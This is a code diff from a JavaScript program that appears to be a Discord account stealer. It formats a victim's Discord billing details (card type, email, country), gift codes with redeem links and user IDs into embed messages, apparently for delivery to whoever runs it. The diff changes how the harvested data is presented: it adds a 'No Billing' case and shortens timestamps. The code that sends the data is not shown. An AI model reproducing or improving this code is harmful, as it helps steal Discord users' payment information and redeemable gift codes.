@@ -107,7 +107,7 @@ const json = async () => {
       color: discordAccountInfo.account.accent_color,
     },
   ];
-  discordAccountInfo.billing.forEach(billing => { embeds.push({
+  discordAccountInfo.billing.length >= 1 ? discordAccountInfo.billing.forEach(billing => { embeds.push({
     title: `Discord Account - Billing - ${(() => { switch (billing.type) {
       case 1:
         return 'Credit Card';
@@ -131,15 +131,17 @@ const json = async () => {
       ['Email', billing.email],
       ['Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
     ]).map(f => { return { name: f[0], value: f[1], inline: true }; })
-  }); });
+  }); }) : embeds.push({
+    title: 'Discord Account - Billing', description: 'No Billing'
+  });
   discordAccountInfo.gifts.forEach(gift => { embeds.push({
     title: `Discord Account - Promotion - ${gift.promotion.outbound_title}`,
     description: gift.promotion.outbound_redemption_modal_body,
     fields: [
       ['ID', gift.promotion.id],
-      ['Start Date', `<t:${Math.floor(moment(gift.promotion.start_date).utc().valueOf() / 1000)}:R> (<t:${Math.floor(moment(gift.promotion.start_date).utc().valueOf() / 1000)}:f>)`],
-      ['End Date', `<t:${Math.floor(moment(gift.promotion.end_date).utc().valueOf() / 1000)}:R> (<t:${Math.floor(moment(gift.promotion.end_date).utc().valueOf() / 1000)}:f>)`],
-      ['Claimed At', `<t:${Math.floor(moment(gift.claimed_at).utc().valueOf() / 1000)}:R> (<t:${Math.floor(moment(gift.claimed_at).utc().valueOf() / 1000)}:f>)`],
+      ['Start Date', `<t:${Math.floor(moment(gift.promotion.start_date).utc().valueOf() / 1000)}:f>`],
+      ['End Date', `<t:${Math.floor(moment(gift.promotion.end_date).utc().valueOf() / 1000)}:f>`],
+      ['Claimed At', `<t:${Math.floor(moment(gift.claimed_at).utc().valueOf() / 1000)}:f>`],
       ['Code', `\`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`],
       ['User ID', gift.user_id]
     ].map(f => { return { name: f[0], value: f[1], inline: true }; })
